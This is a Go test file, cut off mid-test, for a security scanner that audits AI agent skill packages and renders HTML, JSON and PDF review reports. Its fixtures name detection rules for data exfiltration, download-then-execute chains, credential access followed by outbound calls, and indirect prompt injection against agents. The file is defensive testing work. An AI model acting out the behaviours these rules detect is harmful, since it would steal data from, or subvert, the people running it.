package handler

import (
	"context"
	"encoding/base64"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"skill-scanner/internal/config"
	"skill-scanner/internal/docx"
	"skill-scanner/internal/evaluator"
	"skill-scanner/internal/llm"
	"skill-scanner/internal/plugins"
	"skill-scanner/internal/review"
)

type fakeLLMReviewClient struct {
	mu            sync.Mutex
	results       map[string]*llm.AnalysisResult
	obfuscation   map[string]*llm.ObfuscationAnalysisResult
	err           error
	calls         []string
	delay         time.Duration
	inFlight      int
	maxConcurrent int
}

func (f *fakeLLMReviewClient) AnalyzeCode(ctx context.Context, name, description, codeSummary string) (*llm.AnalysisResult, error) {
	f.mu.Lock()
	f.inFlight++
	if f.inFlight > f.maxConcurrent {
		f.maxConcurrent = f.inFlight
	}
	f.calls = append(f.calls, name+"|"+description+"|"+codeSummary)
	delay := f.delay
	result := f.results[name]
	err := f.err
	f.mu.Unlock()
	defer func() {
		f.mu.Lock()
		f.inFlight--
		f.mu.Unlock()
	}()
	if delay > 0 {
		time.Sleep(delay)
	}
	if err != nil {
		return nil, err
	}
	if result == nil {
		return nil, nil
	}
	return result, nil
}

func (f *fakeLLMReviewClient) AnalyzeObfuscatedContent(ctx context.Context, name, content string) (*llm.ObfuscationAnalysisResult, error) {
	f.mu.Lock()
	result := f.obfuscation[name]
	err := f.err
	f.mu.Unlock()
	if err != nil {
		return nil, err
	}
	if result == nil {
		return nil, nil
	}
	return result, nil
}

func TestBuildHTMLReportContainsSequenceSections(t *testing.T) {
	base := baseScanOutput{evaluatedRules: 10, totalRules: 10, coverageNote: "已完成当前规则集全量检测（仅覆盖系统已配置规则）"}
	base.cacheStats = incrementalCacheStats{Enabled: true, Candidate: 10, Hit: 6, Miss: 4, CacheFilePath: "/tmp/demo/.scan-cache.json"}
	base.profile = skillAnalysisProfile{
		DeclarationSources: []string{"SKILL.md"},
		SourceFiles:        []string{"SKILL.md", "scripts/run.py"},
		Dependencies:       []string{"requests==2.31.0"},
		Permissions:        []string{"network"},
		AnalysisMode:       "语义模型 + LLM 意图分析 + 沙箱行为分析 + V7 规则引擎全链路评估",
		SourceFileCount:    2,
		DeclarationCount:   1,
		DependencyCount:    1,
		LanguageSummary:    []string{"markdown:1", "python:1"},
		CapabilitySignals:  []string{"网络访问"},
	}
	base.trace = []analysisTraceEvent{{Stage: "semantic_evaluation", Status: "completed", Message: "V7 规则、语义模型和 LLM 意图分析完成"}}
	base.ruleProfile = ruleSetProfile{
		Version:         "7.0",
		Total:           2,
		ByLayer:         []string{"P0:1", "P1:1"},
		BySeverity:      []string{"高风险:1", "中风险:1"},
		ByDetectionType: []string{"function:1", "pattern:1"},
		BlockedRules:    []string{"V7-001 恶意代码与破坏性行为"},
		ReviewRules:     []string{"V7-015 工具响应投毒与间接提示注入"},
		Reason:          "规则画像原因",
		Benefit:         "规则画像好处",
	}
	refined := review.Result{
		Behavior: review.BehaviorProfile{
			BehaviorTimelines: []string{"sample.go | 时序: 下载(L10,x1) -> 执行(L20,x1) -> 外联(L25,x1)"},
			SequenceAlerts:    []string{"命中下载后执行时序"},
		},
		Summary:           review.ScoreSummary{Admission: "UserDecisionRequired", RiskLevel: "medium", MediumRisk: 1},
		Pipeline:          []review.PipelineStage{{Name: "sandbox_execute", Purpose: "采集行为", Status: "completed", Output: "完成", Benefit: "更清晰"}},
		EvidenceInventory: []review.EvidenceInventory{{Category: "行为时序", Count: 1, Meaning: "还原行为顺序", Examples: []string{"sample"}}},
		OptimizationNotes: []review.OptimizationNote{{Change: "阶段化 Pipeline", Reason: "原链路不透明", Benefit: "过程可解释"}},
		StructuredFindings: []review.StructuredFinding{{
			ID:                  "SF-001",
			RuleID:              "V7-001",
			Title:               "恶意代码与破坏性行为",
			Severity:            "高风险",
			Category:            "命令执行",
			Confidence:          "高",
			AttackPath:          "下载后执行",
			Evidence:            []string{"requests.post(url, data)"},
			CalibrationBasis:    []string{"存在高危时序告警"},
			FalsePositiveChecks: []string{"确认相关脚本不会进入发布包或动态加载链路"},
			ReviewGuidance:      "优先复核攻击路径",
			Source:              "BehaviorGuard",
			DeduplicatedCount:   2,
		}},
		VulnerabilityBlocks: []review.VulnerabilityBlock{{ID: "SF-001", Format: "structured-vuln-block", Content: "<vuln>\n  <title>恶意代码与破坏性行为</title>\n</vuln>"}},
		RuleExplanations: []review.RuleExplanation{{
			RuleID:                   "V7-001",
			Name:                     "恶意代码与破坏性行为",
			Severity:                 "高风险",
			DetectionType:            "function",
			Action:                   "block",
			Triggered:                true,
			DetectionCriteria:        []string{"检测方式: function"},
			ExclusionConditions:      []string{"仅在确认相关脚本不会进入发布包或动态加载链路时，才可降为观察项。"},
			VerificationRequirements: []string{"确认入口可达并存在真实执行链路"},
			OutputRequirements:       []string{"输出具体文件路径"},
			PromptTemplateSummary:    "必须先检查排除条件",
			RemediationFocus:         "限制下载落地与后续执行",
		}},
		FalsePositiveReviews: []review.FalsePositiveReview{{
			FindingID:          "SF-001",
			Verdict:            "倾向真实风险: 建议优先修复并复扫。",
			Exploitability:     "较高: 存在行为链或高危时序证据。",
			Impact:             "可能导致任意命令执行。",
			EvidenceStrength:   "强: 多源证据可互相印证。",
			ReachabilityChecks: []string{"确认风险代码所在文件是否属于技能发布包和主执行路径。"},
			ExclusionChecks:    []string{"确认相关脚本不会进入发布包或动态加载链路"},
			RequiredFollowUp:   []string{"补充最小复现路径"},
		}},
		DetectionComparison: []review.DetectionChainComparison{{
			Area:             "深度审计与多 Agent 推理",
			CurrentStatus:    "当前链路以规则、语义、LLM 意图、沙箱和威胁情报聚合为主。",
			BaselineApproach: "参考基线通常会把深度审计任务拆成多阶段任务包，并用独立复核提示提升覆盖。",
			Winner:           "参考基线领先",
			Gap:              "缺少独立复核 Agent。",
			Optimization:     "增加二次 LLM 复核阶段。",
			Evidence:         []string{"structured findings:1"},
		}},
		ReviewAgentTasks: []review.ReviewAgentTask{{
			FindingID:        "SF-001",
			AgentRole:        "vuln-reviewer",
			Objective:        "以零误报标准复核结构化风险。",
			Inputs:           []string{"structured_finding:SF-001"},
			StrictStandards:  []string{"没有具体证据时不得确认真实风险。"},
			Prompt:           "你是严格的漏洞复核 Agent。",
			ExpectedOutputs:  []string{"verdict"},
			BlockingCriteria: []string{"确认存在高危命令执行。"},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{
			FindingID:        "SF-001",
			Verdict:          "confirmed",
			Confidence:       "高",
			Reason:           "证据闭环",
			Fix:              "优先复核攻击路径",
			Reviewer:         "deterministic-vuln-reviewer",
			StandardsApplied: []string{"入口可达性"},
		}, {
			FindingID:        "SF-001",
			Verdict:          "confirmed",
			Confidence:       "高",
			Reason:           "LLM 二次复核同样确认存在真实风险",
			Fix:              "按复核结论收敛高危路径",
			Reviewer:         "llm-vuln-reviewer",
			StandardsApplied: []string{"多源证据交叉验证"},
		}},
		CapabilityMatrix: []review.CapabilityConsistency{{
			Capability:      "外联/网络访问",
			Declared:        true,
			StaticDetected:  true,
			LLMDetected:     true,
			SandboxDetected: false,
			Status:          "已声明但沙箱未验证",
			RiskImpact:      "可能产生数据外发",
			Gap:             "沙箱未检出对应行为",
			NextStep:        "核验目标白名单",
			Evidence:        []string{"规则证据: V7-003"},
		}},
		AuditEvents: []review.AuditEvent{{Type: "statusUpdate", StepID: "pipeline-01", Status: "completed", Brief: "沙箱执行完成", ToolName: "sandbox", Timestamp: "2026-04-29T00:00:00Z"}},
	}

	base.intentSummary = intentReportSummary{
		Available:      true,
		DeclaredIntent: "LLM 判断该技能用于生成代码安全审查摘要。",
		ActualBehavior: "LLM 判断该技能读取代码并输出风险说明。",
	}
	rawDeclaration := "这是技能声明原文，不应在一致性章节直接展示"
	findings := []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道", Description: "检测到外联", Location: "scripts/run.py:12", CodeSnippet: "requests.post(url, data)"}}
	html := buildHTMLReport("demo.zip", rawDeclaration, findings, base, refined, nil)

	if !strings.Contains(html, "技能分析画像") || !strings.Contains(html, "评分与分值字段仅作辅助参考") {
		t.Fatalf("expected html report contains analysis profile and user decision state")
	}
	if !strings.Contains(html, "处置建议") || !strings.Contains(html, "不代替人工审批") {
		t.Fatalf("expected html report uses evidence-led disposition wording")
	}
	if !strings.Contains(html, "验证结论摘要") || !strings.Contains(html, "仍需人工验证") || !strings.Contains(html, "已完成验证") {
		t.Fatalf("expected html report contains verification summary before profile")
	}
	if !strings.Contains(html, "提交声明") || !strings.Contains(html, rawDeclaration) || !strings.Contains(html, "生成时间") {
		t.Fatalf("expected html report exposes declaration and generated time in primary view")
	}
	if !strings.Contains(html, "风险与能力综合研判") {
		t.Fatalf("expected html report contains integrated risk capability review")
	}
	if strings.Contains(html, "阻断规则") {
		t.Fatalf("expected html report avoids blocking-oriented rule wording")
	}
	if !strings.Contains(html, "风险与能力综合研判") || !strings.Contains(html, "误报检查") || !strings.Contains(html, "校准依据") || !strings.Contains(html, "下载后执行") || !strings.Contains(html, "输出要求") {
		t.Fatalf("expected html report contains aggregated risk findings with review evidence")
	}
	if !strings.Contains(html, "<pre class=\"code-box\">requests.post(url, data)</pre>") {
		t.Fatalf("expected html report renders code-like key evidence in code blocks")
	}
	if strings.Contains(html, "请查看 JSON 报告") {
		t.Fatalf("expected html report to display full content without redirecting to JSON")
	}
	if strings.Contains(html, "能力与证据总览") || !strings.Contains(html, "相关能力与证据") {
		t.Fatalf("expected html report merges capability evidence into integrated review section")
	}
	for _, hidden := range []string{"规则体系画像", "结构化分析追踪", "结构化审计事件流", "阶段化分析 Pipeline", "优化说明（原因与收益）", "链路观察与后续优化", "检测链路对比与优化项", "下一步:"} {
		if strings.Contains(html, hidden) {
			t.Fatalf("expected user-facing html report hides internal section %q", hidden)
		}
	}
	if !strings.Contains(html, "href=\"#appendix\"") || !strings.Contains(html, "附录与完整性") || !strings.Contains(html, "评估完整性证明") || !strings.Contains(html, "评估项检测记录（全量）") || !strings.Contains(html, "V7 评估项覆盖分类") {
		t.Fatalf("expected html report contains appendix navigation and appendix sections")
	}
	if !strings.Contains(html, "增量缓存") {
		t.Fatalf("expected appendix contains incremental cache summary")
	}
	if !strings.Contains(html, "缓存命中率") {
		t.Fatalf("expected appendix contains incremental cache hit rate")
	}
	if strings.Contains(html, "可复核漏洞块") {
		t.Fatalf("expected appendix hides reusable vuln blocks section")
	}
	if strings.Contains(html, "SF-001 / structured-vuln-block") {
		t.Fatalf("expected vulnerability block title to prefer finding title")
	}
	if strings.Contains(html, "规则解释卡") || strings.Contains(html, "零误报复核清单") {
		t.Fatalf("expected html report removes old fragmented sections")
	}
	for _, legacy := range []string{"<h2>风险发现</h2>", "<h2>声明与行为一致性</h2>", "<h2>IoC 与情报信誉</h2>", "<h2>行为证据采集", "<h2>反逃逸与差分执行分析</h2>"} {
		if strings.Contains(html, legacy) {
			t.Fatalf("expected legacy duplicated section %q removed from html", legacy)
		}
	}
	if !strings.Contains(html, "排除条件") || !strings.Contains(html, "可达性检查") || !strings.Contains(html, "倾向真实风险") {
		t.Fatalf("expected html report contains merged rule and false-positive review details")
	}
	if strings.Contains(html, "AI-Infra-Guard") || strings.Contains(html, "Based on Tencent") {
		t.Fatalf("expected html report to avoid external attribution wording")
	}
	if strings.Contains(html, "二次复核任务与裁决（已并入综合研判）") {
		t.Fatalf("expected html report hides standalone review workflow section")
	}
	if !strings.Contains(html, "对应修复建议") {
		t.Fatalf("expected risk item to contain one-to-one remediation guidance")
	}
	if strings.Contains(html, "汇总修复建议") {
		t.Fatalf("expected summary remediation section removed to avoid duplication")
	}
	if !strings.Contains(html, "语言/文件类型分布") || !strings.Contains(html, "源码能力信号") {
		t.Fatalf("expected html report contains project profile details")
	}
	if !strings.Contains(html, rawDeclaration) {
		t.Fatalf("expected html report to expose submitted declaration in primary view")
	}
}

func TestBuildHTMLReportUsesCJKFriendlyFontStack(t *testing.T) {
	htmlReport := buildHTMLReport("skill.zip", "", nil, baseScanOutput{}, review.Result{}, nil)
	for _, want := range []string{"Microsoft YaHei", "PingFang SC", "Noto Sans CJK SC", "WenQuanYi Micro Hei"} {
		if !strings.Contains(htmlReport, want) {
			t.Fatalf("expected HTML report contains %q font fallback", want)
		}
	}
}

func TestBuildHTMLReportIncludesPrintAndCodeLayoutFixes(t *testing.T) {
	htmlReport := buildHTMLReport("skill.zip", "", nil, baseScanOutput{}, review.Result{}, nil)
	for _, want := range []string{"@media print", "@page{size:A4 landscape", "zoom:.86", "body.pdf-compact{zoom:.80 !important}", "details>:not(summary){display:block !important}", "white-space:pre-wrap", "word-break:break-all", "overflow-wrap:anywhere"} {
		if !strings.Contains(htmlReport, want) {
			t.Fatalf("expected html report contains layout fix %q", want)
		}
	}
	if !strings.Contains(htmlReport, ".source-strip .pill{white-space:normal;word-break:break-word;overflow-wrap:anywhere}") {
		t.Fatalf("expected html report constrains source-strip pill wrapping")
	}
	if !strings.Contains(htmlReport, ".capability-card{border:1px solid #e1e8f6;border-radius:12px;background:#fbfcff;padding:12px 14px;min-width:0;max-width:100%;overflow:hidden}") {
		t.Fatalf("expected html report constrains capability-card width within parent")
	}
}

func TestBuildJSONReportPayloadIncludesObfuscationEvidence(t *testing.T) {
	refined := review.Result{
		ObfuscationEvidence: []review.ObfuscationEvidence{{
			Path:            "payload.js",
			Technique:       "base64",
			Confidence:      "medium",
			Summary:         "更像是配置编码",
			DecodedText:     "curl https://safe.example/api",
			DataFlowSignals: []string{"解码结果疑似流向网络链"},
		}},
	}
	payload := buildJSONReportPayload("<html></html>", "text", nil, baseScanOutput{}, refined)
	items, ok := payload["obfuscation_evidence"].([]review.ObfuscationEvidence)
	if !ok {
		t.Fatalf("expected obfuscation_evidence in payload, got %#v", payload["obfuscation_evidence"])
	}
	if len(items) != 1 || items[0].Path != "payload.js" {
		t.Fatalf("unexpected obfuscation evidence payload: %+v", items)
	}
}

func TestBuildJSONReportPayloadIncludesIncrementalCacheStats(t *testing.T) {
	base := baseScanOutput{
		totalRules:     10,
		evaluatedRules: 9,
		cacheStats: incrementalCacheStats{
			Enabled:       true,
			Candidate:     12,
			Hit:           8,
			Miss:          4,
			CacheFilePath: "/tmp/demo/.scan-cache.json",
		},
	}
	payload := buildJSONReportPayload("<html></html>", "text", nil, base, review.Result{})
	coverage, ok := payload["coverage"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected coverage object, got %#v", payload["coverage"])
	}
	cachePart, ok := coverage["incremental_cache"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected incremental_cache in coverage, got %#v", coverage["incremental_cache"])
	}
	if cachePart["enabled"] != true {
		t.Fatalf("expected enabled=true, got %#v", cachePart["enabled"])
	}
	if cachePart["candidate_files"] != 12 || cachePart["hit_files"] != 8 || cachePart["miss_files"] != 4 {
		t.Fatalf("unexpected incremental cache stats: %#v", cachePart)
	}
}

func TestRenderAppendixSectionIncrementalCacheHitRateBoundaries(t *testing.T) {
	baseZero := baseScanOutput{cacheStats: incrementalCacheStats{Enabled: true, Candidate: 0, Hit: 0, Miss: 0}}
	htmlZero := renderAppendixSection(baseZero, nil)
	if !strings.Contains(htmlZero, "缓存命中率:</strong> 0.0%") {
		t.Fatalf("expected 0 candidate hit rate to be 0.0%%, got %q", htmlZero)
	}

	baseFull := baseScanOutput{cacheStats: incrementalCacheStats{Enabled: true, Candidate: 5, Hit: 5, Miss: 0}}
	htmlFull := renderAppendixSection(baseFull, nil)
	if !strings.Contains(htmlFull, "缓存命中率:</strong> 100.0%") {
		t.Fatalf("expected full hit rate 100.0%%, got %q", htmlFull)
	}

	baseNone := baseScanOutput{cacheStats: incrementalCacheStats{Enabled: true, Candidate: 7, Hit: 0, Miss: 7}}
	htmlNone := renderAppendixSection(baseNone, nil)
	if !strings.Contains(htmlNone, "缓存命中率:</strong> 0.0%") {
		t.Fatalf("expected no-hit rate 0.0%%, got %q", htmlNone)
	}
}

func TestIncrementalCacheTraceDetailBoundaries(t *testing.T) {
	enabledZero := incrementalCacheStats{Enabled: true, Candidate: 0, Hit: 0, Miss: 0}
	hitRate := incrementalCacheHitRate(enabledZero)
	event := newAnalysisTraceEvent("incremental_cache", "completed", "增量扫描缓存统计", "")
	event.Detail = "模式:增量 候选:0 命中:0 未命中:0 命中率:" + "0.0%"
	if hitRate != 0.0 || !strings.Contains(event.Detail, "命中率:0.0%") {
		t.Fatalf("expected zero candidate detail with 0.0%%, hitRate=%v detail=%q", hitRate, event.Detail)
	}
}

func TestIncrementalCacheHitRateFunction(t *testing.T) {
	if got := incrementalCacheHitRate(incrementalCacheStats{Candidate: 0, Hit: 0}); got != 0 {
		t.Fatalf("expected zero candidate hit rate 0, got %v", got)
	}
	if got := incrementalCacheHitRate(incrementalCacheStats{Candidate: 10, Hit: 0}); got != 0 {
		t.Fatalf("expected zero hit rate 0, got %v", got)
	}
	if got := incrementalCacheHitRate(incrementalCacheStats{Candidate: 8, Hit: 6}); got < 74.9 || got > 75.1 {
		t.Fatalf("expected 75%% hit rate, got %v", got)
	}
}

func TestPrepareHTMLForPDFEmbedsConfiguredFont(t *testing.T) {
	tmpDir := t.TempDir()
	htmlPath := filepath.Join(tmpDir, "report.html")
	fontPath := filepath.Join(tmpDir, "test.ttf")
	if err := os.WriteFile(htmlPath, []byte("<html><head></head><body><h1>中文标题</h1></body></html>"), 0644); err != nil {
		t.Fatalf("write html: %v", err)
	}
	fontBytes := []byte("fake-font")
	if err := os.WriteFile(fontPath, fontBytes, 0644); err != nil {
		t.Fatalf("write font: %v", err)
	}
	prev := os.Getenv("REVIEW_REPORT_CJK_FONT_FILE")
	t.Cleanup(func() {
		if prev == "" {
			_ = os.Unsetenv("REVIEW_REPORT_CJK_FONT_FILE")
			return
		}
		_ = os.Setenv("REVIEW_REPORT_CJK_FONT_FILE", prev)
	})
	if err := os.Setenv("REVIEW_REPORT_CJK_FONT_FILE", fontPath); err != nil {
		t.Fatalf("set env: %v", err)
	}
	preparedPath, _, cleanup, err := prepareHTMLForPDF(htmlPath)
	if err != nil {
		t.Fatalf("prepare html for pdf: %v", err)
	}
	defer cleanup()
	if preparedPath == htmlPath {
		t.Fatalf("expected temp html path when font file is configured")
	}
	preparedData, err := os.ReadFile(preparedPath)
	if err != nil {
		t.Fatalf("read prepared html: %v", err)
	}
	encoded := base64.StdEncoding.EncodeToString(fontBytes)
	if !strings.Contains(string(preparedData), encoded) {
		t.Fatalf("expected prepared html to embed base64 font data")
	}
	if !strings.Contains(string(preparedData), "font-display:block") {
		t.Fatalf("expected prepared html enforces block font loading")
	}
	if !strings.Contains(string(preparedData), "font-family:'ReportCJKEmbedded' !important") {
		t.Fatalf("expected prepared html force uses embedded cjk font")
	}
	if !strings.Contains(string(preparedData), "document.querySelectorAll('details')") {
		t.Fatalf("expected prepared html expands details before pdf rendering")
	}
	if !strings.Contains(string(preparedData), "document.body.classList.add('pdf-compact')") {
		t.Fatalf("expected prepared html supports auto compact pdf mode")
	}
}

func TestExpandFontCandidatesResolvesRelativeFromWorkingDirectory(t *testing.T) {
	tmpDir := t.TempDir()
	relDir := filepath.Join(tmpDir, "fonts")
	if err := os.MkdirAll(relDir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	fontPath := filepath.Join(relDir, "demo.ttf")
	if err := os.WriteFile(fontPath, []byte("font"), 0644); err != nil {
		t.Fatalf("write font: %v", err)
	}
	originalWD, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	if err := os.Chdir(tmpDir); err != nil {
		t.Fatalf("chdir: %v", err)
	}
	t.Cleanup(func() {
		_ = os.Chdir(originalWD)
	})
	items := expandFontCandidates([]string{"fonts/demo.ttf"})
	if len(items) == 0 {
		t.Fatalf("expected resolved candidate from working directory")
	}
	if !slices.Contains(items, filepath.Join(tmpDir, "fonts", "demo.ttf")) {
		t.Fatalf("expected absolute candidate path, got %v", items)
	}
}

func TestResolvePDFCJKFontFileUsesConfiguredCandidates(t *testing.T) {
	tmpDir := t.TempDir()
	fontPath := filepath.Join(tmpDir, "custom.ttf")
	if err := os.WriteFile(fontPath, []byte("font"), 0644); err != nil {
		t.Fatalf("write font: %v", err)
	}
	prev := os.Getenv("REVIEW_REPORT_CJK_FONT_FILE")
	t.Cleanup(func() {
		if prev == "" {
			_ = os.Unsetenv("REVIEW_REPORT_CJK_FONT_FILE")
			return
		}
		_ = os.Setenv("REVIEW_REPORT_CJK_FONT_FILE", prev)
	})
	if err := os.Setenv("REVIEW_REPORT_CJK_FONT_FILE", fontPath); err != nil {
		t.Fatalf("set env: %v", err)
	}
	if got := resolvePDFCJKFontFile(); got != fontPath {
		t.Fatalf("expected configured font candidate used first, got %q", got)
	}
	if got := resolvePDFCJKFontDir(); got != tmpDir {
		t.Fatalf("expected configured font dir, got %q", got)
	}
}

func TestBuildJSONReportPayloadCarriesHTMLPrimaryReport(t *testing.T) {
	htmlReport := "<html><body><h1>技能安全审查报告</h1><h2>风险与能力综合研判</h2><p>示例正文</p></body></html>"
	textReport := docx.TextFromHTMLReport(htmlReport)
	payload := buildJSONReportPayload(htmlReport, textReport, nil, baseScanOutput{}, review.Result{})
	primary, ok := payload["primary_report"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected primary_report object, got %+v", payload)
	}
	if primary["source_format"] != "html" {
		t.Fatalf("expected html source format, got %+v", primary)
	}
	if primary["html"] != htmlReport {
		t.Fatalf("expected html report stored in json payload, got %+v", primary)
	}
	text, _ := primary["text"].(string)
	for _, want := range []string{"技能安全审查报告", "风险与能力综合研判", "示例正文"} {
		if !strings.Contains(text, want) {
			t.Fatalf("expected text report contains %q, got %q", want, text)
		}
	}
}

func TestPersistReportsWritesArtifactsWithRestrictedPermissions(t *testing.T) {
	store := newTestStore(t)
	originalName := "demo-skill.zip"
	scanPath := t.TempDir()
	if err := os.WriteFile(filepath.Join(scanPath, "SKILL.md"), []byte("# Demo"), 0600); err != nil {
		t.Fatalf("write skill file: %v", err)
	}
	base := baseScanOutput{sourceRoot: scanPath}
	refined := review.Result{}
	persistedID, _, err := persistReports(store, "perm-task", "admin", originalName, "", nil, base, refined)
	if err != nil {
		t.Fatalf("persist reports: %v", err)
	}
	report := store.GetReport(persistedID)
	if report == nil {
		t.Fatal("expected persisted report metadata")
	}
	for _, rel := range []string{report.HTMLPath, report.JSONPath} {
		info, statErr := os.Stat(filepath.Join(store.ReportsDir(), rel))
		if statErr != nil {
			t.Fatalf("stat artifact %s: %v", rel, statErr)
		}
		if info.Mode().Perm() != 0600 {
			t.Fatalf("expected restricted permission 0600 for %s, got %#o", rel, info.Mode().Perm())
		}
	}
	if report.PDFPath != "" {
		info, statErr := os.Stat(filepath.Join(store.ReportsDir(), report.PDFPath))
		if statErr != nil {
			t.Fatalf("stat pdf artifact %s: %v", report.PDFPath, statErr)
		}
		if info.Mode().Perm() != 0600 {
			t.Fatalf("expected restricted permission 0600 for pdf, got %#o", info.Mode().Perm())
		}
	}
}

func TestBuildReportBaseNameIncludesSourceAndSecondPrecision(t *testing.T) {
	createdAt := time.Date(2026, 5, 1, 16, 7, 8, 0, time.UTC)
	got := buildReportBaseName("demo-skill.zip", createdAt)
	if got != "demo-skill_20260501_160708" {
		t.Fatalf("unexpected report base name: %s", got)
	}
	got = buildReportBaseName("技能扫描目录", createdAt)
	if !strings.Contains(got, "技能扫描目录_20260501_160708") {
		t.Fatalf("expected chinese source name preserved in report base name, got %s", got)
	}
}

func TestBuildVulnerabilityBlocksEscapesStructuredFindings(t *testing.T) {
	blocks := buildVulnerabilityBlocks([]review.StructuredFinding{{
		ID:                  "SF-001",
		RuleID:              "V7-003",
		Title:               "外联 <script>",
		Severity:            "高风险",
		Category:            "外联与情报",
		Confidence:          "高",
		AttackPath:          "向 https://example.com?a=1&b=2 外发",
		Evidence:            []string{"requests.post(url, data)"},
		ChainSummaries:      []string{"行为链: scripts/run.py:10-12 | 外联=1, 凭据访问=1", "时序告警: 命中凭据访问后外联时序"},
		CalibrationBasis:    []string{"存在外联证据"},
		FalsePositiveChecks: []string{"确认该内容不会进入发布包、运行镜像或动态加载链路"},
		ReviewGuidance:      "收敛到白名单",
		Source:              "Static",
	}})

	if len(blocks) != 1 {
		t.Fatalf("expected one vulnerability block, got %+v", blocks)
	}
	content := blocks[0].Content
	for _, want := range []string{"<vuln>", "<risk_type>外联与情报</risk_type>", "<chain_summaries>行为链: scripts/run.py:10-12 | 外联=1, 凭据访问=1；时序告警: 命中凭据访问后外联时序</chain_summaries>", "&lt;script&gt;", "&amp;b=2", "<fix>收敛到白名单</fix>"} {
		if !strings.Contains(content, want) {
			t.Fatalf("expected block contains %q, got %s", want, content)
		}
	}
}

func TestBuildFalsePositiveReviewsRequiresReachabilityEvidenceForFalsePositive(t *testing.T) {
	findings := []review.StructuredFinding{
		{ID: "SF-001", RuleID: "V7-009", Title: "命令执行", Severity: "高风险", Category: "命令执行", Confidence: "高", AttackPath: "下载后执行", Evidence: []string{"scripts/run.py:10"}, CalibrationBasis: []string{"存在高危时序告警"}, FalsePositiveChecks: []string{"确认相关脚本不会进入发布包或动态加载链路"}, DeduplicatedCount: 2},
		{ID: "SF-002", RuleID: "V7-003", Title: "外联示例", Severity: "中风险", Category: "外联与情报", Confidence: "待复核", AttackPath: "example request", Evidence: []string{"examples/demo.py:5"}, FalsePositiveChecks: []string{"确认该示例文件不会进入发布包或被动态加载"}},
	}
	refined := review.Result{
		Behavior:         review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序"}},
		RuleExplanations: []review.RuleExplanation{{RuleID: "V7-003", ExclusionConditions: []string{"仅在确认不会传输敏感数据且不存在重定向或动态改写时，才按普通请求处理。"}}},
	}
	reviews := buildFalsePositiveReviews(findings, refined)

	if len(reviews) != 2 {
		t.Fatalf("expected two false-positive reviews, got %+v", reviews)
	}
	if !strings.Contains(reviews[0].Verdict, "倾向真实风险") || !strings.Contains(reviews[0].EvidenceStrength, "强") {
		t.Fatalf("expected real risk review for first finding, got %+v", reviews[0])
	}
	if !strings.Contains(reviews[1].Verdict, "疑似误报") || !strings.Contains(strings.Join(reviews[1].ExclusionChecks, "\n"), "普通请求") {
		t.Fatalf("expected second finding to downgrade with exclusion checks, got %+v", reviews[1])
	}
}

func TestBuildFalsePositiveReviewsDowngradesInternalDevelopmentTargets(t *testing.T) {
	findings := []review.StructuredFinding{{
		ID:       "SF-001",
		RuleID:   "V7-003",
		Title:    "本地开发外联",
		Severity: "中风险",
		Category: "外联与情报",
		Evidence: []string{"config/dev.yaml:8 callback=http://localhost:3000/api"},
	}}
	reviews := buildFalsePositiveReviews(findings, review.Result{})
	if len(reviews) != 1 {
		t.Fatalf("expected one review, got %+v", reviews)
	}
	if !strings.Contains(reviews[0].Verdict, "疑似误报") {
		t.Fatalf("expected localhost-only finding downgraded, got %+v", reviews[0])
	}
}

func TestBuildDetectionChainComparisonHighlightsRemainingGaps(t *testing.T) {
	base := baseScanOutput{trace: []analysisTraceEvent{{Stage: "preflight", Status: "completed"}}}
	refined := review.Result{
		StructuredFindings:   []review.StructuredFinding{{ID: "SF-001"}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001"}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-001"}},
		CapabilityMatrix:     []review.CapabilityConsistency{{Capability: "命令执行"}},
		AuditEvents:          []review.AuditEvent{{Type: "statusUpdate"}},
		Behavior:             review.BehaviorProfile{ProbeWarnings: []string{"沙箱未触发"}},
	}
	items := buildDetectionChainComparison(base, refined)

	if len(items) < 5 {
		t.Fatalf("expected multiple comparison items, got %+v", items)
	}
	joined := ""
	for _, item := range items {
		joined += item.Area + " " + item.Winner + " " + item.Optimization + "\n"
	}
	for _, want := range []string{"参考基线领先", "当前链路更贴合 Skill 安全审查", "LLM reviewer", "rules_v7.yaml schema 扩展"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("expected comparison contains %q, got %+v", want, items)
		}
	}
	notes := buildDetectionComparisonOptimizationNotes(items)
	if len(notes) == 0 || !strings.Contains(notes[0].Change, "检测链路差距") || notes[0].Reason == "" || notes[0].Benefit == "" {
		t.Fatalf("expected comparison gaps converted to optimization notes, got %+v", notes)
	}
}

func TestBuildRuleExplanationsAddsCriteriaAndTriggeredStatus(t *testing.T) {
	cfg := &config.Config{Version: "7.0", Rules: []config.Rule{{
		ID:       "V7-003",
		Name:     "敏感数据外发与隐蔽通道",
		Severity: "高风险",
		Detection: config.Detection{
			Type:     "function",
			Function: "detectDataExfiltration",
		},
		OnFail: config.OnFail{Action: "block", Reason: "检测到敏感数据外发或隐蔽通道"},
		Review: config.Review{
			PromptTemplate:           "只在存在真实外发路径时报告。",
			DetectionCriteria:        []string{"必须存在外联调用和敏感数据源"},
			ExclusionConditions:      []string{"排除 localhost 开发请求"},
			VerificationRequirements: []string{"确认请求目标和传输字段"},
			OutputRequirements:       []string{"输出完整攻击路径"},
			RemediationFocus:         "强制外联白名单",
		},
	}}}
	explanations := buildRuleExplanations(cfg)
	marked := markTriggeredRuleExplanations(explanations, []plugins.Finding{{RuleID: "V7-003"}})

	if len(marked) != 1 || !marked[0].Triggered {
		t.Fatalf("expected triggered rule explanation, got %+v", marked)
	}
	joined := strings.Join(append(append(marked[0].DetectionCriteria, marked[0].ExclusionConditions...), marked[0].VerificationRequirements...), "\n")
	for _, want := range []string{"必须存在外联调用", "detectDataExfiltration", "排除 localhost", "确认请求目标", "确认目标域名"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("expected rule explanation contains %q, got %+v", want, marked[0])
		}
	}
	if marked[0].PromptTemplateSummary != "只在存在真实外发路径时报告。" || marked[0].RemediationFocus != "强制外联白名单" {
